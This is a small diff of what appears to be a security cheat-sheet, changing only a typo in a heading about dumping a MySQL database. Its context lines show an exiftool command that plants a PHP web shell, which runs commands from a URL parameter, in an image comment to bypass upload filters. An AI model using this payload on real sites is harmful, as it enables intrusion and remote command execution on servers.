@@ -51,7 +51,7 @@ image file upload bypass
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
 ```
 
-dump mysql database data without using mysql clinet tool
+dump mysql database data without using mysql client tool
 
 ```
 mysqldump -u root -p database_name > database_name.sql
